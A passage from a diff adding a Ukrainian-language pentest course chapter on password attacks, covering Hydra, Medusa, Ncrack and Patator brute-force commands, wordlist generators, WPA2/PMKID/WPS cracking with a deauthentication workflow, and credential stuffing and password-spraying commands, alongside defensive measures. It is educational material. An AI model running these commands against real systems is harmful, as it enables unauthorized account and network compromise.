+          <li><strong>Mask-атака:</strong> <code>hashcat -a 3 -m MODE hashes.txt ?u?l?l?l?l?l?d?d?s</code></li>
+          <li><strong>Повний перебір:</strong> <code>hashcat -a 3 -m MODE hashes.txt ?a?a?a?a?a?a?a?a</code> (8 символів)</li>
+        </ol>
+
+        <h3>Rainbow Tables</h3>
+        <p><strong>Rainbow Tables</strong> — попередньо обчислені таблиці відповідностей хеш-пароль, що реалізують принцип <strong>time-memory tradeoff</strong>: замість обчислення хешу для кожного пароля в реальному часі, атакуючий використовує готову таблицю для миттєвого пошуку.</p>
+        <ul>
+          <li><strong>RainbowCrack</strong> — основний інструмент: <code>rtgen</code> (генерація), <code>rtsort</code> (сортування), <code>rcrack</code> (зламування)</li>
+          <li>Розмір таблиць: MD5 (a-z, 1-8 символів) &asymp; <strong>460 GB</strong></li>
+          <li><strong>Повністю нейтралізуються сіллю</strong> — кожне значення солі потребує окремої таблиці</li>
+          <li>У сучасному пентесті rainbow tables <strong>переважно застарілі</strong> через швидкість GPU: зламування MD5 на RTX 4090 швидше, ніж пошук у таблиці</li>
+          <li>Досі корисні для LM Hash (Windows), де немає солі та обмежений набір символів</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 6.4 Онлайн-атаки: Hydra, Medusa, Ncrack                     -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>6.4 Онлайн-атаки: Hydra, Medusa, Ncrack</h2>
+
+        <p>На відміну від офлайн-атак, <strong>онлайн-атаки</strong> (network brute-force) виконуються безпосередньо проти мережевих сервісів автентифікації. Атакуючий надсилає пари логін:пароль через мережевий протокол (SSH, FTP, HTTP тощо) та аналізує відповідь сервера. Швидкість обмежена мережевою затримкою, продуктивністю сервера та механізмами захисту (lockout, rate limiting).</p>
+
+        <h3>THC-Hydra</h3>
+        <p><strong>THC-Hydra</strong> (автор: van Hauser / THC) — найпопулярніший інструмент для онлайн-брутфорсу. Підтримує понад <strong>50 протоколів</strong>, включаючи SSH, FTP, RDP, VNC, HTTP-GET, HTTP-POST-FORM, SMB, MySQL, MSSQL, PostgreSQL, SMTP, POP3, IMAP, LDAP, Telnet, SIP, Redis, MongoDB та інші.</p>
+
+        <h3>Основні прапорці Hydra</h3>
+        <table>
+          <tr>
+            <th>Прапорець</th>
+            <th>Опис</th>
+            <th>Приклад</th>
+          </tr>
+          <tr><td><code>-l</code> / <code>-L</code></td><td>Логін / файл логінів</td><td><code>-l admin</code> / <code>-L users.txt</code></td></tr>
+          <tr><td><code>-p</code> / <code>-P</code></td><td>Пароль / файл паролів</td><td><code>-p password</code> / <code>-P rockyou.txt</code></td></tr>
+          <tr><td><code>-t</code></td><td>Кількість потоків (за замовч. 16)</td><td><code>-t 4</code> (для SSH)</td></tr>
+          <tr><td><code>-f</code></td><td>Зупинитись після першого знайденого</td><td><code>-f</code></td></tr>
+          <tr><td><code>-w</code></td><td>Таймаут очікування відповіді (сек)</td><td><code>-w 10</code></td></tr>
+          <tr><td><code>-V</code></td><td>Verbose — показувати кожну спробу</td><td><code>-V</code></td></tr>
+          <tr><td><code>-o</code></td><td>Записати результати у файл</td><td><code>-o results.txt</code></td></tr>
+          <tr><td><code>-s</code></td><td>Вказати нестандартний порт</td><td><code>-s 2222</code></td></tr>
+          <tr><td><code>-e nsr</code></td><td>Перевірити: n=пустий, s=як логін, r=реверс</td><td><code>-e nsr</code></td></tr>
+        </table>
+
+        <h3>Приклади команд Hydra</h3>
+        <pre><code># SSH брутфорс (один логін, словник паролів)
+hydra -l root -P /usr/share/wordlists/rockyou.txt \
+  -t 4 -f 192.168.1.100 ssh
+
+# FTP брутфорс (список логінів і паролів)
+hydra -L users.txt -P passwords.txt \
+  -t 8 -f 192.168.1.100 ftp
+
+# RDP (Remote Desktop Protocol)
+hydra -l administrator -P passwords.txt \
+  -t 1 -w 5 192.168.1.100 rdp
+
+# VNC (без логіна, тільки пароль)
+hydra -P passwords.txt -t 1 192.168.1.100 vnc
+
+# SMB (Windows file sharing)
+hydra -l admin -P passwords.txt \
+  -t 4 192.168.1.100 smb
+
+# MySQL
+hydra -l root -P passwords.txt \
+  -t 4 192.168.1.100 mysql
+
+# HTTP Basic Auth
+hydra -l admin -P passwords.txt \
+  192.168.1.100 http-get /admin/
+
+# HTTP POST Form (веб-форма логіну)
+hydra -l admin -P passwords.txt \
+  192.168.1.100 http-post-form \
+  "/login:username=^USER^&amp;password=^PASS^:F=Invalid credentials"
+
+# HTTPS POST Form
+hydra -l admin -P passwords.txt \
+  -s 443 192.168.1.100 https-post-form \
+  "/login:user=^USER^&amp;pass=^PASS^:F=Login failed"</code></pre>
+
+        <p><strong>Синтаксис HTTP-form:</strong> <code>"URL:ПАРАМЕТРИ:УМОВА_ПОМИЛКИ"</code>, де <code>^USER^</code> та <code>^PASS^</code> — маркери для підстановки, <code>F=</code> — текст, що з'являється при невдалому вході.</p>
+
+        <h3>Medusa</h3>
+        <p><strong>Medusa</strong> — модульний інструмент для онлайн-брутфорсу. Стабільний для паралельного сканування кількох хостів одночасно.</p>
+        <pre><code># SSH брутфорс
+medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh -t 4
+
+# FTP з файлом хостів
+medusa -H hosts.txt -u admin -P passwords.txt -M ftp -T 4
+
+# Combo-файл (host:user:pass)
+medusa -C combo.txt -M ssh</code></pre>
+
+        <h3>Ncrack</h3>
+        <p><strong>Ncrack</strong> — розроблений командою Nmap. Інтегрується з результатами Nmap XML (<code>-iX</code>). Підтримує timing templates (<code>-T 0-5</code>).</p>
+        <pre><code># SSH брутфорс
+ncrack -p ssh -U users.txt -P passwords.txt 192.168.1.100
+
+# Використання результатів Nmap
+ncrack -iX nmap_scan.xml -U users.txt -P passwords.txt
+
+# Повільний режим (менше шансів на виявлення)
+ncrack -T 2 -p ssh -U users.txt -P passwords.txt 192.168.1.100</code></pre>
+
+        <h3>Patator</h3>
+        <p><strong>Patator</strong> — модульний Python-інструмент з гнучкою системою фільтрації відповідей:</p>
+        <pre><code># SSH брутфорс
+patator ssh_login host=192.168.1.100 user=root \
+  password=FILE0 0=passwords.txt \
+  -x ignore:mesg='Authentication failed.'
+
+# FTP брутфорс
+patator ftp_login host=192.168.1.100 user=admin \
+  password=FILE0 0=passwords.txt \
+  -x ignore:mesg='Login incorrect.'
+
+# HTTP POST form
+patator http_fuzz url=http://192.168.1.100/login method=POST \
+  body='user=admin&amp;pass=FILE0' 0=passwords.txt \
+  -x ignore:fgrep='Invalid'</code></pre>
+
+        <h3>Burp Suite Intruder</h3>
+        <p><strong>Burp Suite Intruder</strong> — графічний інструмент для брутфорсу веб-форм. Workflow:</p>
+        <ol>
+          <li>Перехопити запит логіну через <strong>Proxy</strong> (Intercept)</li>
+          <li>Надіслати запит у <strong>Intruder</strong> (Ctrl+I)</li>
+          <li>Позначити позиції для підстановки (виділити значення та натиснути <strong>Add &sect;</strong>)</li>
+          <li>Обрати тип атаки та завантажити словник</li>
+          <li>Запустити атаку та аналізувати відповіді за довжиною або статус-кодом</li>
+        </ol>
+        <p>Типи атак Burp Intruder:</p>
+        <table>
+          <tr>
+            <th>Тип</th>
+            <th>Опис</th>
+            <th>Використання</th>
+          </tr>
+          <tr>
+            <td><strong>Sniper</strong></td>
+            <td>Один словник по черзі для кожної позиції</td>
+            <td>Тестування одного параметра</td>
+          </tr>
+          <tr>
+            <td><strong>Battering Ram</strong></td>
+            <td>Один словник одночасно для всіх позицій</td>
+            <td>Одне значення в кілька полів</td>
+          </tr>
+          <tr>
+            <td><strong>Pitchfork</strong></td>
+            <td>Кілька словників, елементи по черзі (1-1, 2-2, 3-3)</td>
+            <td>Пари user:password</td>
+          </tr>
+          <tr>
+            <td><strong>Cluster Bomb</strong></td>
+            <td>Кілька словників, всі комбінації (декартів добуток)</td>
+            <td>Повний перебір user x password</td>
+          </tr>
+        </table>
+
+        <h3>Порівняння інструментів онлайн-брутфорсу</h3>
+        <table>
+          <tr>
+            <th>Параметр</th>
+            <th>Hydra</th>
+            <th>Medusa</th>
+            <th>Ncrack</th>
+            <th>Patator</th>
+          </tr>
+          <tr>
+            <td><strong>Мова</strong></td>
+            <td>C</td>
+            <td>C</td>
+            <td>C++</td>
+            <td>Python</td>
+          </tr>
+          <tr>
+            <td><strong>Протоколи</strong></td>
+            <td>50+</td>
+            <td>~25</td>
+            <td>~10</td>
+            <td>Модульний</td>
+          </tr>
+          <tr>
+            <td><strong>Швидкість</strong></td>
+            <td>Висока</td>
+            <td>Середня</td>
+            <td>Висока</td>
+            <td>Середня</td>
+          </tr>
+          <tr>
+            <td><strong>Гнучкість</strong></td>
+            <td>Середня</td>
+            <td>Середня</td>
+            <td>Обмежена</td>
+            <td>Висока</td>
+          </tr>
+          <tr>
+            <td><strong>Nmap інтеграція</strong></td>
+            <td>Ні</td>
+            <td>Ні</td>
+            <td>Так (-iX)</td>
+            <td>Ні</td>
+          </tr>
+          <tr>
+            <td><strong>Фільтрація</strong></td>
+            <td>Проста (F=)</td>
+            <td>Проста</td>
+            <td>Проста</td>
+            <td>Потужна (-x)</td>
+          </tr>
+        </table>
+
+        <h3>Виявлення та протидія онлайн-атакам</h3>
+        <ul>
+          <li><strong>IDS/IPS алерти</strong> — Snort, Suricata виявляють масові спроби автентифікації</li>
+          <li><strong>Account Lockout</strong> — блокування акаунту після N невдалих спроб (типово: 5 спроб, 30 хвилин блокування)</li>
+          <li><strong>Fail2ban</strong> — моніторинг логів та автоматичне блокування IP через iptables/nftables</li>
+          <li><strong>Rate Limiting</strong> — обмеження кількості запитів від одного IP за одиницю часу</li>
+          <li><strong>CAPTCHA</strong> — перевірка «людина чи бот» після кількох невдалих спроб</li>
+          <li><strong>Географічна фільтрація</strong> — блокування автентифікації з нетипових локацій</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 6.5 Словники та генерація wordlists                          -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>6.5 Словники та генерація wordlists</h2>
+
+        <p>Ефективність словникової атаки повністю залежить від <strong>якості словника</strong>. Правильно підібраний wordlist може зламати 70-80% паролів за хвилини, тоді як повний brute-force тих самих паролів зайняв би роки.</p>
+
+        <h3>rockyou.txt</h3>
+        <p>Найвідоміший wordlist у кібербезпеці. Історія: у 2009 році компанія <strong>RockYou</strong> (розробник додатків для Facebook) була зламана. Виявилось, що 32 мільйони паролів зберігалися у <strong>відкритому тексті</strong> (plaintext). Після дедуплікації залишилось <strong>14.3 мільйони</strong> унікальних паролів.</p>
+
+        <p>Топ-10 паролів із RockYou:</p>
+        <ol>
+          <li><code>123456</code> (290,731 використань)</li>
+          <li><code>12345</code> (79,078)</li>
+          <li><code>123456789</code> (76,790)</li>
+          <li><code>password</code> (59,462)</li>
+          <li><code>iloveyou</code> (49,952)</li>
+          <li><code>princess</code> (33,291)</li>
+          <li><code>1234567</code> (21,726)</li>
+          <li><code>rockyou</code> (20,901)</li>
+          <li><code>12345678</code> (20,553)</li>
+          <li><code>abc123</code> (17,542)</li>
+        </ol>
+
+        <pre><code># Розташування в Kali Linux
+ls -la /usr/share/wordlists/rockyou.txt.gz
+# -rw-r--r-- 1 root root 53,357,587  rockyou.txt.gz
+
+# Розпакування
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
+# Розмір розпакованого файлу
+wc -l /usr/share/wordlists/rockyou.txt
+# 14344392 /usr/share/wordlists/rockyou.txt</code></pre>
+
+        <h3>SecLists (Daniel Miessler)</h3>
+        <p><strong>SecLists</strong> — найбільша курована колекція wordlists для пентесту. Категорії:</p>
+        <table>
+          <tr>
+            <th>Директорія</th>
+            <th>Вміст</th>
+            <th>Ключові файли</th>
+          </tr>
+          <tr>
+            <td><code>Passwords/</code></td>
+            <td>Словники паролів</td>
+            <td><code>Common-Credentials/10k-most-common.txt</code>, <code>Leaked-Databases/</code>, <code>Default-Credentials/</code></td>
+          </tr>
+          <tr>
+            <td><code>Usernames/</code></td>
+            <td>Списки імен користувачів</td>
+            <td><code>Names/names.txt</code>, <code>top-usernames-shortlist.txt</code></td>
+          </tr>
+          <tr>
+            <td><code>Discovery/</code></td>
+            <td>Директорії та файли для enumeration</td>
+            <td><code>Web-Content/directory-list-2.3-medium.txt</code></td>
+          </tr>
+          <tr>
+            <td><code>Fuzzing/</code></td>
+            <td>Payload'и для fuzzing</td>
+            <td><code>SQLi/</code>, <code>XSS/</code>, <code>LFI/</code></td>
+          </tr>
+        </table>
+        <pre><code># Встановлення в Kali
+sudo apt install seclists
+
+# Розташування
+ls /usr/share/seclists/Passwords/</code></pre>
+
+        <h3>CeWL (Custom Word List Generator)</h3>
+        <p><strong>CeWL</strong> — інструмент, що сканує (spider) веб-сайт цілі та витягує слова для створення <strong>таргетованого словника</strong>. Ідеально підходить для цільових атак, де паролі можуть базуватись на корпоративній термінології.</p>
+        <pre><code># Базове сканування сайту
+cewl https://example.com -d 2 -m 5 -w wordlist.txt
+# -d 2 — глибина сканування (2 рівні посилань)
+# -m 5 — мінімальна довжина слова (5 символів)
+# -w   — файл для збереження
+
+# Включити email-адреси
+cewl https://example.com -d 2 -m 5 -e --email_file emails.txt -w words.txt
+
+# Включити числа
+cewl https://example.com -d 2 -m 5 --with-numbers -w wordlist.txt</code></pre>
+
+        <h3>Crunch</h3>
+        <p><strong>Crunch</strong> — генератор wordlists, що створює <strong>усі можливі комбінації</strong> за заданим шаблоном та набором символів.</p>
+        <pre><code># Усі 4-символьні комбінації a-z (456,976 слів)
+crunch 4 4 abcdefghijklmnopqrstuvwxyz -o wordlist.txt
+
+# 6-8 символів з цифр і маленьких літер
+crunch 6 8 0123456789abcdefghijklmnopqrstuvwxyz -o wordlist.txt
+
+# За шаблоном: @@@@%%% (4 літери + 3 цифри)
+crunch 7 7 -t @@@@%%% -o wordlist.txt
+# @ = маленька літера, , = велика літера
+# % = цифра, ^ = спеціальний символ
+
+# УВАГА щодо розміру файлу!
+# 8 символів (a-z) = 208 мільярдів слів = ~2 TB файл</code></pre>
+
+        <h3>CUPP (Common User Password Profiler)</h3>
+        <p><strong>CUPP</strong> — генератор таргетованих wordlists на основі особистої інформації про жертву. В інтерактивному режимі запитує ім'я, прізвище, дату народження, клички тварин, ім'я партнера тощо, а потім генерує тисячі мутацій:</p>
+        <pre><code># Інтерактивний режим
+cupp -i
+# First Name: John
+# Surname: Smith
+# Nickname: johnny
+# Birthdate (DD/MM/YYYY): 15/03/1990
+# Partner's name: Mary
+# Pet's name: Rex
+# ...
+# [+] Generated 14523 passwords
+
+# Завантажити словники з репозиторію
+cupp -l
+
+# Дослідження за profiling (Alecto)
+cupp -a</code></pre>
+
+        <h3>Kwprocessor</h3>
+        <p><strong>Kwprocessor</strong> — генератор паролів на основі <strong>клавіатурних патернів</strong> (keyboard walks): qwerty, 1qaz2wsx, zxcvbn, qazwsxedc тощо. Ці патерни часто використовуються як «складні» паролі, але легко зламуються:</p>
+        <pre><code># Генерація keyboard walks довжиною 8-12
+kwp basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route \
+  | head -100</code></pre>
+
+        <h3>Mentalist</h3>
+        <p><strong>Mentalist</strong> — GUI-інструмент для побудови wordlists через ланцюжок трансформацій: <strong>Base Words &rarr; Mutations &rarr; Output</strong>. Дозволяє візуально налаштувати складні правила мутації без знання синтаксису Hashcat/JtR.</p>
+
+        <h3>Правила мутації: статистика ефективності</h3>
+        <p>Комбінація словника з правилами мутації значно підвищує ефективність:</p>
+        <table>
+          <tr>
+            <th>Підхід</th>
+            <th>Приблизний відсоток зламаних</th>
+            <th>Час (1M хешів MD5)</th>
+          </tr>
+          <tr>
+            <td>rockyou.txt (без правил)</td>
+            <td>~45%</td>
+            <td>&lt; 1 секунди</td>
+          </tr>
+          <tr>
+            <td>rockyou.txt + best64.rule</td>
+            <td>~70%</td>
+            <td>~5 секунд</td>
+          </tr>
+          <tr>
+            <td>rockyou.txt + d3ad0ne.rule</td>
+            <td>~75%</td>
+            <td>~2 хвилини</td>
+          </tr>
+          <tr>
+            <td>rockyou.txt + dive.rule</td>
+            <td>~78%</td>
+            <td>~7 хвилин</td>
+          </tr>
+          <tr>
+            <td>CeWL + CUPP + правила</td>
+            <td>~85% (для таргетованої атаки)</td>
+            <td>Залежить від словника</td>
+          </tr>
+        </table>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 6.6 Атаки на Wi-Fi паролі                                    -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>6.6 Атаки на Wi-Fi паролі</h2>
+
+        <p>Wi-Fi мережі, захищені паролем, є поширеною ціллю для пентестерів. Зламування пароля Wi-Fi є <strong>офлайн-атакою</strong>: після захоплення handshake або PMKID атакуючий працює локально, без подальшого контакту з мережею.</p>
+
+        <h3>WPA/WPA2 — огляд безпеки</h3>
+        <ul>
+          <li><strong>WPA2-Personal (PSK)</strong> — Pre-Shared Key, один пароль для всіх користувачів</li>
+          <li><strong>Хешування:</strong> PBKDF2 з <strong>4096 ітераціями</strong> SHA-1 для генерації PMK (Pairwise Master Key) із PSK + SSID</li>
+          <li><strong>Шифрування:</strong> CCMP/AES (WPA2), TKIP (WPA, застарілий)</li>
+          <li><strong>PMK = PBKDF2(HMAC-SHA1, PSK, SSID, 4096, 256)</strong></li>
+        </ul>
+
+        <h3>4-Way Handshake</h3>
+        <p>Процес взаємної автентифікації між клієнтом (STA) та точкою доступу (AP):</p>
+        <ol>
+          <li><strong>AP &rarr; STA:</strong> ANonce (випадкове число від AP)</li>
+          <li><strong>STA &rarr; AP:</strong> SNonce + MIC (клієнт обчислює PTK = f(PMK, ANonce, SNonce, MAC_AP, MAC_STA), надсилає SNonce та MIC для верифікації)</li>
+          <li><strong>AP &rarr; STA:</strong> GTK (груповий ключ, зашифрований PTK) + MIC</li>
+          <li><strong>STA &rarr; AP:</strong> ACK (підтвердження)</li>
+        </ol>
+        <p><strong>Для зламування</strong> достатньо захопити перші два повідомлення handshake. Далі атакуючий перебирає паролі локально, генеруючи PMK &rarr; PTK &rarr; MIC та порівнюючи MIC із захопленим.</p>
+
+        <h3>Атака на WPA2: повний workflow</h3>
+        <pre><code># Крок 1: Увімкнення режиму монітора
+sudo airmon-ng start wlan0
+# Інтерфейс стає wlan0mon
+
+# Крок 2: Сканування мереж
+sudo airodump-ng wlan0mon
+# Записати: BSSID (MAC AP), CH (канал), ESSID (назва мережі)
+
+# Крок 3: Захоплення handshake (фокус на конкретну мережу)
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
+  -w capture wlan0mon
+# -c 6    — канал
+# --bssid — MAC-адреса точки доступу
+# -w      — ім'я файлу для збереження
+
+# Крок 4: Деаутентифікація (у другому терміналі)
+# Примусово відключити клієнта, щоб він перепідключився і ми захопили handshake
+sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF \
+  -c 11:22:33:44:55:66 wlan0mon
+# -0 5    — 5 деаутентифікаційних пакетів
+# -a      — BSSID точки доступу
+# -c      — MAC клієнта (необов'язково, без -c деаутентифікує всіх)
+
+# Крок 5: Зламування (після захоплення handshake)
+aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
+
+# Або через Hashcat (значно швидше з GPU):
+# Конвертація формату
+hcxpcapngtool capture-01.cap -o hash.hc22000
+# Зламування
+hashcat -a 0 -m 22000 hash.hc22000 rockyou.txt</code></pre>
+
+        <h3>PMKID-атака (2018)</h3>
+        <p>У серпні 2018 <strong>Jens Steube</strong> (автор Hashcat) виявив новий метод атаки на WPA/WPA2, що <strong>не потребує захоплення handshake</strong> і, відповідно, не потребує підключеного клієнта.</p>
+        <ul>
+          <li><strong>PMKID</strong> = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_STA)</li>
+          <li>AP надсилає PMKID у першому EAPOL-фреймі при спробі підключення</li>
+          <li>Атакуючий просто ініціює підключення та отримує PMKID</li>
+          <li>Далі — стандартний офлайн-перебір із Hashcat (-m 22000)</li>
+        </ul>
+        <pre><code># Захоплення PMKID
+sudo hcxdumptool -i wlan0mon -o dump.pcapng \
+  --enable_status=1 --filterlist_ap=AA:BB:CC:DD:EE:FF \
+  --filtermode=2
+
+# Конвертація
+hcxpcapngtool dump.pcapng -o hash.hc22000
+
+# Зламування
+hashcat -a 0 -m 22000 hash.hc22000 rockyou.txt</code></pre>
+
+        <h3>WPS PIN-атака</h3>
+        <p><strong>WPS</strong> (Wi-Fi Protected Setup) — функція спрощеного підключення через 8-значний PIN. Критична вразливість: PIN перевіряється двома частинами (4+3 цифри + контрольна сума), що зменшує простір перебору з 10^8 до <strong>~11,000 комбінацій</strong>.</p>
+        <pre><code># Сканування мереж з увімкненим WPS
+wash -i wlan0mon
+
+# Атака на WPS PIN
+reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
+# Час: ~2-10 годин (якщо немає rate limiting)
+
+# Bully — альтернатива Reaver
+bully wlan0mon -b AA:BB:CC:DD:EE:FF -e "NetworkName" -c 6</code></pre>
+
+        <h3>Evil Twin / Fluxion</h3>
+        <p><strong>Evil Twin</strong> — створення підробної точки доступу, ідентичної легітимній. Процес:</p>
+        <ol>
+          <li>Створити копію цільової мережі (той самий SSID, MAC)</li>
+          <li>Деаутентифікувати клієнтів від легітимної AP</li>
+          <li>Клієнти підключаються до підробної AP</li>
+          <li>Captive portal запитує «пароль Wi-Fi для оновлення»</li>
+          <li>Fluxion перевіряє введений пароль проти захопленого handshake</li>
+        </ol>
+        <p><strong>Fluxion</strong> автоматизує весь процес Evil Twin атаки.</p>
+
+        <h3>Wifite2</h3>
+        <p><strong>Wifite2</strong> — автоматизований інструмент аудиту Wi-Fi. Автоматично виявляє мережі, захоплює handshake/PMKID, атакує WPS, та запускає зламування словником:</p>
+        <pre><code># Запуск (автоматичний режим)
+sudo wifite
+
+# Вказати конкретний словник
+sudo wifite --dict /usr/share/wordlists/rockyou.txt</code></pre>
+
+        <h3>WPA3-SAE</h3>
+        <p><strong>WPA3</strong> (2018) використовує <strong>SAE</strong> (Simultaneous Authentication of Equals) — протокол Dragonfly key exchange:</p>
+        <ul>
+          <li><strong>Захист від офлайн-атак</strong> — навіть із захопленим трафіком неможливо перебрати паролі офлайн</li>
+          <li><strong>Forward Secrecy</strong> — компрометація ключа не розкриває минулий трафік</li>
+          <li><strong>Dragonblood (2019)</strong> — вразливості CVE-2019-9494 та CVE-2019-9495, side-channel атаки на SAE. Виправлені у оновленнях</li>
+          <li><strong>Transition mode</strong> — WPA3/WPA2 сумісність дозволяє downgrade-атаки: примусити клієнта підключитись через WPA2</li>
+        </ul>
+
+        <h3>Швидкість зламування WPA2</h3>
+        <table>
+          <tr>
+            <th>Пароль</th>
+            <th>RTX 4090 (~2.5 MH/s)</th>
+          </tr>
+          <tr><td>8 символів (a-z)</td><td>~23 години</td></tr>
+          <tr><td>8 символів (a-z, 0-9)</td><td>~4 дні</td></tr>
+          <tr><td>8 символів (a-zA-Z0-9)</td><td>~98 днів</td></tr>
+          <tr><td>10 символів (a-z)</td><td>~6.5 років</td></tr>
+          <tr><td>12 символів (a-z)</td><td>~4400 років</td></tr>
+        </table>
+
+        <h3>Захист Wi-Fi</h3>
+        <ul>
+          <li>Використовувати <strong>WPA3</strong> (або WPA2-Enterprise/RADIUS для корпоративних мереж)</li>
+          <li><strong>Вимкнути WPS</strong> — основний вектор атаки на побутові роутери</li>
+          <li>Довга парольна фраза: <strong>12+ символів</strong>, краще випадково згенерована</li>
+          <li>Регулярне оновлення прошивки роутера</li>
+          <li>Моніторинг підключених пристроїв та rogue AP detection</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 6.7 Credential Stuffing та Password Spraying                  -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>6.7 Credential Stuffing та Password Spraying</h2>
+
+        <p>Ці два типи атак експлуатують <strong>людський фактор</strong> — звички користувачів у створенні та управлінні паролями. На відміну від класичного брутфорсу, вони оптимізовані для уникнення механізмів захисту.</p>
+
+        <h3>Credential Stuffing</h3>
+        <p><strong>Credential Stuffing</strong> — автоматизоване використання пар <strong>email:password</strong> з витоків даних для спроб автентифікації на інших сервісах. Ефективність базується на тому, що <strong>65% користувачів повторно використовують паролі</strong> на різних сервісах.</p>
+        <ul>
+          <li><strong>Успішність:</strong> 0.1-2% від загальної кількості спроб. При мільйонах пар це тисячі скомпрометованих акаунтів</li>
+          <li><strong>Масштаб:</strong> 193 мільярди спроб credential stuffing зафіксовано у 2024 році (Akamai State of the Internet)</li>
+          <li><strong>Інструменти:</strong> SentryMBA, OpenBullet 2, Snipr, власні скрипти на Python/Go</li>
+        </ul>
+
+        <p>Типова схема credential stuffing:</p>
+        <ol>
+          <li>Отримання бази витоків (darknet, Telegram-канали, публічні дампи)</li>
+          <li>Очищення та дедуплікація: email:password пари</li>
+          <li>Ротація проксі (residential proxies, SOCKS5, Tor) для обходу IP-блокування</li>
+          <li>Антибот-обхід: ротація User-Agent, затримки між запитами, CAPTCHA-солвери</li>
+          <li>Масовий перебір проти цільових сервісів</li>
+          <li>Збір та монетизація скомпрометованих акаунтів</li>
+        </ol>
+
+        <h3>Password Spraying</h3>
+        <p><strong>Password Spraying</strong> — зворотний підхід: <strong>один пароль перебирається проти багатьох акаунтів</strong>. Це дозволяє обійти політики блокування облікових записів, оскільки кожен акаунт отримує лише 1-2 спроби.</p>
+        <ul>
+          <li><strong>Типові паролі для spraying:</strong> <code>Spring2025!</code>, <code>Summer2025!</code>, <code>Welcome1</code>, <code>Password1!</code>, <code>Company123</code>, <code>Qwerty123!</code></li>
+          <li><strong>Затримка:</strong> 30-60 хвилин між спробами (щоб уникнути lockout)</li>
+          <li><strong>Ідеальна ціль:</strong> Active Directory з тисячами облікових записів</li>
+        </ul>
+
+        <p>Інструменти для Password Spraying:</p>
+        <table>
+          <tr>
+            <th>Інструмент</th>
+            <th>Протоколи</th>
+            <th>Команда</th>
+          </tr>
+          <tr>
+            <td><strong>CrackMapExec / NetExec</strong></td>
+            <td>SMB, WinRM, LDAP, MSSQL, SSH</td>
+            <td><code>nxc smb 10.10.10.0/24 -u users.txt -p 'Spring2025!' --continue-on-success</code></td>
+          </tr>
+          <tr>
+            <td><strong>Spray (Greenwolf)</strong></td>
+            <td>SMB, OWA, Lync, CISCO</td>
+            <td><code>spray.sh -smb 10.10.10.100 users.txt passwords.txt 1 35</code></td>
+          </tr>
+          <tr>
+            <td><strong>Kerbrute</strong></td>
+            <td>Kerberos (AD)</td>
+            <td><code>kerbrute passwordspray -d domain.local users.txt 'Spring2025!'</code></td>
+          </tr>
+          <tr>
+            <td><strong>Ruler</strong></td>
+            <td>Exchange / Outlook</td>
+            <td><code>ruler --domain domain.com brute --users users.txt --passwords pass.txt</code></td>
+          </tr>
+        </table>
+
+        <p><strong>Kerberos pre-auth spraying</strong> через Kerbrute є особливо ефективним: він швидший за SMB і генерує менше логів, оскільки невдалі спроби Kerberos не завжди логуються як failed login events (Event ID 4625).</p>
+
+        <h3>Великі витоки даних</h3>
+        <table>
+          <tr>
+            <th>Назва</th>
+            <th>Рік</th>
+            <th>Кількість записів</th>
+            <th>Дані</th>
+          </tr>
+          <tr>
+            <td><strong>Yahoo</strong></td>
+            <td>2013-2014</td>
+            <td>3 мільярди</td>
+            <td>Імена, email, хеші MD5, секретні питання</td>
+          </tr>
+          <tr>
+            <td><strong>Collection #1-5</strong></td>
+            <td>2019</td>
+            <td>2.2 мільярди</td>
+            <td>Email:password пари з різних витоків</td>
+          </tr>
+          <tr>
+            <td><strong>Facebook</strong></td>
+            <td>2021</td>
+            <td>533 мільйони</td>
+            <td>Імена, телефони, email, локації</td>
+          </tr>
+          <tr>
+            <td><strong>LinkedIn</strong></td>
+            <td>2021</td>
+            <td>700 мільйонів</td>
+            <td>Профілі, email, телефони (scraping)</td>
+          </tr>
+          <tr>
+            <td><strong>RockYou2024</strong></td>
+            <td>2024</td>
+            <td>10 мільярдів</td>
+            <td>Компіляція паролів з різних витоків</td>
+          </tr>
+        </table>
+
+        <h3>Have I Been Pwned (HIBP)</h3>
+        <p><strong>Have I Been Pwned</strong> — проєкт <strong>Troy Hunt</strong>, що дозволяє перевірити, чи були ваші облікові дані скомпрометовані:</p>
+        <ul>
+          <li><strong>13+ мільярдів</strong> скомпрометованих облікових записів з 800+ витоків</li>
+          <li><strong>k-anonymity API</strong> — дозволяє перевіряти паролі без надсилання повного хешу (надсилаються лише перші 5 символів SHA-1)</li>
+          <li><strong>Інтеграція:</strong> Firefox Monitor, 1Password, Bitwarden, Azure AD Password Protection</li>
+          <li><strong>URL:</strong> haveibeenpwned.com</li>
+        </ul>
+        <pre><code># Перевірка пароля через API (k-anonymity)
+# SHA-1 хеш "password" = 5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8
+# Надсилаємо перші 5 символів: 5BAA6
+curl https://api.pwnedpasswords.com/range/5BAA6
+# Відповідь містить хвости хешів та кількість витоків
+# 1E4C9B93F3F0682250B6CF8331B7EE68FD8:10434788
+# Знайдено 10,434,788 разів!</code></pre>
+
+        <h3>Реальні інциденти</h3>
+
+        <p><strong>Colonial Pipeline (2021)</strong></p>
+        <ul>
+          <li><strong>Вектор:</strong> один скомпрометований VPN-обліковий запис (пароль із витоку)</li>
+          <li><strong>Відсутність MFA</strong> на VPN-шлюзі</li>
+          <li><strong>Наслідки:</strong> ransomware DarkSide, зупинка найбільшого нафтопроводу США, $4.4 млн викупу</li>
+        </ul>
+
+        <p><strong>Okta (2024)</strong></p>
+        <ul>
+          <li><strong>Вектор:</strong> credential stuffing через residential proxies</li>
+          <li><strong>Наслідки:</strong> компрометація клієнтських тенантів, крадіжка Okta session tokens</li>
+        </ul>
+
+        <p><strong>Microsoft / Midnight Blizzard (2024)</strong></p>
+        <ul>
